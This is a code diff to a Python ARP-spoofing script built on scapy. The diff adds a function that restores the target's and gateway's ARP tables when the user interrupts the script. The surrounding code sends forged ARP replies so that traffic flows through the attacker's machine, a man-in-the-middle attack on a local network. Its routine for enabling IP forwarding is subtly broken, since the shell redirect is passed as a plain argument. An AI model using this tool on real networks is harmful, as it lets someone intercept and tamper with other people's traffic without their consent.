@@ -10,7 +10,7 @@ def spoof(target_ip, spoof_ip):
 
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)  # op=2 stands for
-    # the type of request
+    # the type of request,
     scapy.send(packet, verbose=False)  # send the packet
 
 
@@ -35,6 +35,16 @@ def get_argument():
     return options
 
 
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)  # IMPORTANT:
+    # if hwsrc not set then default value would be our own device's address, rendering the function useless for the case
+    # print(packet.show())
+    # print(packet.summary())
+    scapy.send(packet, count=4, verbose=False)  # sets count=4 to avoid single failure
+
+
 # works only when run by root
 def enable_ip_fwr():
     exit_code = subprocess.call(['echo', '1', '>', '/proc/sys/net/ipv4/ip_forward'])
@@ -53,6 +63,10 @@ try:
         time.sleep(2)
 
 except KeyboardInterrupt:
+
+    print('[*] Restoring ARP Table')
+    restore(arguments.target_ip, arguments.gateway_ip)
+    restore(arguments.gateway_ip, arguments.target_ip)
     print("\n[*]Exiting.... \n[*] Program finished")
 
 
